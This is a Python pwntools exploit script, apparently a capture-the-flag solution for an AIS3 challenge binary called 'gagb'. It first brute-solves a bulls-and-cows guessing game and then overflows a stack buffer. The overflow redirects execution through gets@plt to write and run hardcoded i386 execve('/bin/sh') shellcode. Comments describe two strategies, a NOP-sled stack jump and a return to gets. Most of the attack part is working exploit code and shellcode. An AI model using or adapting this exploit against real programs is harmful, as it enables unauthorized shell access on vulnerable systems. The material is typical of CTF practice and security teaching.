#!/usr/bin/env python

from pwn import *
from time import sleep
from sys import *

## pwn context
context(arch = 'i386', os = 'linux')

def genall():
	r = [];
	for i in range(10):
		for j in range(10):
			for k in range(10):
				for l in range(10):
					if i != j and i != k and i != l and j != k and j != l and k != l:
						r.append(chr(ord('0')+i) + chr(ord('0')+j) + chr(ord('0')+k) + chr(ord('0')+l))
	return r;

def match(r, s, a, b):
	mya = 0
	myb = 0
	for i in range(len(r)):
		for j in range(len(r)):
			if(i == j):
				if(r[i] == s[j]):
					mya = mya + 1;
			else:
				if(r[i] == s[j]):
					myb = myb + 1;
	if mya == a and myb == b:
		return True
	return False

def matchlist(r, f, a, b):
	s = []
	for i in range(len(r)):
		if match(r[i], f, a, b):
			s.append(r[i])
	return s

##

num = genall()

#r = remote('final.ais3.org', 9192)
r = process("./gagb")

while len(num) >= 1:
	print r.recv();
	print len(num), "send:", num[0]
	r.send(num[0])
	r.send("\n")
	ans = r.recvline();
	print ans
	#
	l = ans.split();
	mya = ord(l[1]) - ord('0')
	myb = ord(l[3]) - ord('0')
	#print l, mya, myb
	if mya == 4:
		break;
	num = matchlist(num, num[0], mya, myb)

print num

#r.send('A'*100 + "\n");
#r.send('A'*32 + "\n");	# 28 + 4
#r.interactive()

shell =	"\x31\xc0\x50\x68\x2f\x2f\x73" + \
	"\x68\x68\x2f\x62\x69\x6e\x89" + \
	"\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
	"\xcd\x80\x31\xc0\x40\xcd\x80";

########
# strategy #1
# overflow eip and jump to shell code in the stack
# - may not work with aslr
# - has to "guess" stack address, e.g., stack @ bffdf000-c0000000
# b *0x8048618: ret after gets()
########

#r.send('A'*28 + p32(0xbffffe10) + "\x90" * 400 + shell + "\n");

########
# strategy #2 - works better
# use gets() to fill shell codes in a writable memory,
# and then execute the filled codes
# - fill eip with get@plt @ 08048430
# - find a writable memory address, e.g., real codes for rand() function
# note: you can use objdump -d <binary> to get required address, e.g.,
#	08048430: gets@plt
#	080484d0: rand@plt
#	0804a034: rand@plt jumps to here
########

r.send('A'*28 + p32(0x08048430) + p32(0x0804a034) + p32(0x0804a034) + p32(0x0804a034) * 100 + "\n");
r.send(shell + "\n");
#r.send(asm(shellcraft.sh()) + "\n");

r.interactive();

